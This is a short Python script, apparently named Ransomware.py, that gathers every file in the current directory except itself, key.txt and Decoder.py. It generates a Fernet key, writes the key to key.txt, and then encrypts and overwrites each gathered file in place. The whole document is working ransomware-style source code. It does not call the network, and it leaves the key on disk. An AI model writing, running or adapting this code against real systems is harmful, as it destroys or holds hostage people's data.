# Import necessary libraries
import os
from cryptography.fernet import Fernet

# List to store target files
Targets = []

# Iterate through files in the current directory
for file in os.listdir():
    # Exclude certain files from the target list
    if file == "Ransomware.py" or file == "key.txt" or file == "Decoder.py":
        continue
    Targets.append(file)
print(Targets)

# Generate a new encryption key using Fernet
Key = Fernet.generate_key()

# Write the key to a file named "key.txt" in binary mode
KeyFile = open("key.txt", 'wb')
KeyFile.write(Key)
KeyFile.close()

# Initialize Fernet with the generated key
Key = Fernet(Key)

# Encrypt and overwrite contents of each target file
for file in Targets:
    # Open the file in text mode and read its contents
    TheFile = open(file, "r")
    Contents = TheFile.read()

    # Encrypt the content using the Fernet key
    Encrypted_Content = Key.encrypt(Contents.encode())

    # Decrypt the content for demonstration purposes
    Decrypted_Content = Key.decrypt(Encrypted_Content).decode()

    # Display the encrypted content
    print(Encrypted_Content)

    # Open the file in binary mode and write the encrypted content back to the file
    TheFile = open(file, "wb")
    TheFile.write(Encrypted_Content)
    TheFile.close()